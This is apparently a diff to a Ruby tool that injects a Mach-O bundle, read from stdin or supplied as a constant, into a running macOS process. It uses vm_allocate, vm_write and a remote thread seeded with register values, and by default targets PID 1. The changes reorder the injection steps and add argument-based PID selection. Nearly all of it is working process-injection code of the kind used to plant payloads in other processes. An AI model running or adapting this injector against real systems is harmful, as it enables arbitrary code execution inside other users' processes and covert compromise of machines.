@@ -219,14 +219,13 @@ INJECT_BUNDLE = [
 
 # Read a Mach-o bundle from stdin and inject it in process id ARGV[0]
 def main(pid)
-  # Get the task handle
-  task = MachTask.new(pid)
-  # Setup a custom bundle segment and point edi to it
-  state = SystemB::X86ThreadState.new
-
   # Inject bundle payload P if supplied.
   # Otherwise read from stdin.
-  bundle = P  # P should be supplied by the caller.
+  begin
+    bundle = P  # P should be supplied by the caller.
+  rescue NameError => e
+    $stderr << "[*] reading bundle from $stdin"
+  end
   bundle = $stdin.read if bundle.nil?
   # Make sure P didn't gain a newline in the process
   bundle = bundle[1..-1] if bundle[0] == "\n"
@@ -234,14 +233,22 @@ def main(pid)
   #bundle += ARGV.join(" ")
   #bundle += [ARGV.join(" ").length].pack('V')
   #bundle += [0].pack('c')
+
+  # Get the task handle
+  task = MachTask.new(pid)
+  # Allocate the bundle in the target process and place it there
   bundle_segment = SystemB::vm_allocate(task.handle, bundle.length)
+  SystemB::vm_write(task.handle, bundle_segment, bundle)
+  # Prep the registers
+  state = SystemB::X86ThreadState.new
   state[:edi] = bundle_segment
   state[:esi] = bundle.length
-  SystemB::vm_write(task.handle, bundle_segment, bundle)
   thread = task.create_running_thread(INJECT_BUNDLE, state)
 end
 
 # TODO: make the args a value to be appended to the bundle
-main(1)
-#main(44379)
-
+if __FILE__ == $0
+  pid = 1
+  pid = ARGV[0].to_i if ARGV.length > 0
+  main(pid)
+end
